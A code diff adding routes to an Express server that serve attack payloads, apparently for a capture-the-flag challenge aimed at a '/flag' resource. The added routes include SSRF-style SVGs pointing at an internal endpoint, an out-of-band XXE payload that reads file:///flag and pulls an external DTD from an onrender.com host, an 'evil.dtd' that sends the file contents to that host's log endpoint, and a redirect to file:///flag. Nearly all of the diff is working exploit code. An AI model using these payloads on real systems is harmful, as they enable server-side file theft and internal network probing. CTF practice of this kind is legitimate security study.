@@ -18,6 +18,70 @@ app.get('/test', (req, res) => {
 
 // 1. XXE Injection in SVG
 // Internal endpoint discovery
+app.get('/malformed-svg', (req, res) => {
+  console.log('Malformed SVG requested');
+  // This SVG is intentionally malformed to cause processing errors
+  const malformedSvg = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <image href="http://localhost:8080/flag" width="100" height="100"/>
+  <broken-element that-will-cause-error="true"/>
+  <rect width="100" height="100" fill="red"/>
+</svg>`;
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(malformedSvg);
+});
+// Very large SVG to cause processing issues
+app.get('/large-svg', (req, res) => {
+  console.log('Large SVG requested');
+  let largeSvg = '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" width="10000" height="10000">';
+  
+  // Add many elements to make SVG very large
+  for (let i = 0; i < 1000; i++) {
+    largeSvg += `<rect x="${i*10}" y="${i*10}" width="10" height="10" fill="rgb(${i%255},${i%255},${i%255})"/>`;
+  }
+  
+  largeSvg += `<image href="http://localhost:8080/flag" width="100" height="100"/>`;
+  largeSvg += '</svg>';
+  
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(largeSvg);
+});
+// Try to force direct file reading
+app.get('/direct-file-read', (req, res) => {
+  console.log('Direct file read requested');
+  // This might bypass some filters
+  const payload = `<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///flag">
+  <!ENTITY % dtd SYSTEM "http://ssrf-sbc4.onrender.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>`;
+  
+  res.setHeader('Content-Type', 'application/xml');
+  res.send(payload);
+});
+
+// Evil DTD for OOB XXE
+app.get('/evil.dtd', (req, res) => {
+  console.log('Evil DTD requested');
+  const evilDtd = `<!ENTITY % all "<!ENTITY send SYSTEM 'http://ssrf-sbc4.onrender.com/log?file=%file;'>">%all;`;
+  res.setHeader('Content-Type', 'application/xml');
+  res.send(evilDtd);
+});
+// Redirect to file protocol (might work if filters are weak)
+app.get('/redirect-to-file', (req, res) => {
+  console.log('Redirect to file requested');
+  res.redirect('file:///flag');
+});
+// Valid image but with malicious metadata
+app.get('/valid-image-but-malicious', (req, res) => {
+  console.log('Valid but malicious image requested');
+  // Base64 of a simple red dot PNG with malicious comment
+  const maliciousPng = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
+  res.setHeader('Content-Type', 'image/png');
+  res.send(Buffer.from(maliciousPng, 'base64'));
+});
 app.get('/internal-discovery.svg', (req, res) => {
   console.log('Internal discovery SVG requested');
   const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
